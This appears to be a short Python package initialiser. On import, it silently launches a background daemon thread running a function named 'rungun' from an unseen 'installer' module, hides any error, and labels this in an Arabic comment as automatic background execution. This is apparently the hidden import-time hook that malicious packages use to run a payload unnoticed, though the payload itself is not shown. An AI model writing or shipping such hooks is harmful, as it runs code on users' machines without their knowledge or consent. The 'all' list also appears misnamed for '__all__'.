from .installer import rungun
import threading

# تشغيل تلقائي في الخلفية فور الاستدعاء
try:
    threading.Thread(target=rungun, daemon=True).start()
except:
    pass

version = "1.0.0"
all = ["rungun"]